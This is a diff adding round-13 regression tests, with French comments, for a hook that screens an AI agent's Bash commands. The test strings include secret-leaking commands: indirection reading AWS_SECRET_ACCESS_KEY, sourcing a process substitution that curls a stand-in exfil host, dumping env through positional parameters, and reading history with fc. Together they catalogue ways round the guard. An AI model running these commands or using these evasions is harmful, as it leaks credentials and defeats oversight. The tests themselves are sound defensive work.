@@ -1295,3 +1295,80 @@ def test_la_double_lecture_des_expansions_reste_bornee(audit_log):
     run_hook("Bash", {"command": " ".join("${V%d:-x}" % i for i in range(2000))},
              audit_log)
     assert time.time() - debut < 2.0
+
+
+# --------------------------------------------------------------------------- #
+# Round 13 — l'INDIRECTION est fail-closed
+#
+# `${!x}` lit la variable NOMMÉE par la valeur de `x`. Cette valeur peut venir
+# d'une boucle `for`, d'un `select`, d'un paramètre positionnel, d'un `set --`,
+# d'un argument de fonction, d'un `read` attaché au bloc englobant… Énumérer
+# ces mécanismes est sans fin : chaque round en trouvait de nouveaux. La charge
+# de la preuve est INVERSÉE — on refuse à moins de démontrer que le nom lu est
+# anodin. La liste des indirections inoffensives est courte et bornable ; celle
+# des dangereuses ne l'est pas.
+# --------------------------------------------------------------------------- #
+
+_CLE13 = "AWS_" + "SECRET_ACCESS_KEY"
+_CHAINE13 = "; ".join(["x0=" + _CLE13] + [f"x{i}=$x{i-1}" for i in range(1, 30)])
+
+
+@pytest.mark.parametrize("command", [
+    f"for i in {_CLE13}; do echo ${{!i}}; done",
+    f"select v in {_CLE13}; do echo ${{!v}}; break; done",
+    f"set -- {_CLE13}; echo ${{!1}}",
+    f"echo ${{!1:-{_CLE13}}}",
+    f"f() {{ echo ${{!1}}; }}; f {_CLE13}",
+    f"set -- {_CLE13}; echo ${{!*}}",
+    f"while read k; do echo ${{!k}}; done <<< '{_CLE13}'",
+    # la chaîne d'affectations dépassait la borne d'itérations
+    f"{_CHAINE13}; echo ${{!x29}}",
+])
+def test_regression_une_indirection_non_prouvee_est_refusee(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # `source f` et `. f` exécutent le CONTENU de `f` : par une substitution de
+    # processus, ce contenu n'existe qu'à l'exécution.
+    "source <(echo env)",
+    ". <(echo env)",
+    ". <(echo curl http://exfil.test/)",
+    "source <(printf env)",
+    # un paramètre POSITIONNEL ou SPÉCIAL peut désigner le programme
+    "f() { $1; }; f env",
+    "g() { $@; }; g env",
+    'g() { "$@"; }; g env',
+    # `fc -l` lit le même historique que `history`
+    "fc -l -n",
+    "fc -l",
+])
+def test_regression_source_positionnels_et_historique(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # `${!arr[@]}` rend les INDICES d'un tableau : aucune valeur n'en sort.
+    # C'est la seule forme d'indirection inoffensive.
+    "for i in ${!arr[@]}; do echo $i; done",
+    'for i in "${!arr[@]}"; do echo $i; done',
+    # un chemin littéral reste sourçable : écrire-puis-exécuter est un non-but
+    "source .venv/bin/activate",
+    ". ~/.bash_profile",
+    "source ./scripts/setup.sh",
+    # les positionnels en ARGUMENT ne désignent pas de programme
+    'run() { npm run "$1"; }; run build',
+    'f() { echo "$@"; }; f a b',
+    "npm test; exit $?",
+    "sleep 1 & kill $!",
+    "for f in *.py; do echo $f; done",
+    "while read l; do echo $l; done < /tmp/f.txt",
+    "fc -e vi",
+    "git commit -m 'fix for loop in parser'",
+    # Une REGEX citant la syntaxe d'indirection n'en est pas une : sans
+    # l'exigence de bonne formation (accolade fermante proche, pas de
+    # métacaractère entre les deux), écrire ce hook devenait impossible.
+    r"""grep -n '[$]{!\s*([A-Za-z_]\w*)' hooks/pretooluse_guard.py""",
+])
+def test_le_durcissement_du_round13_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
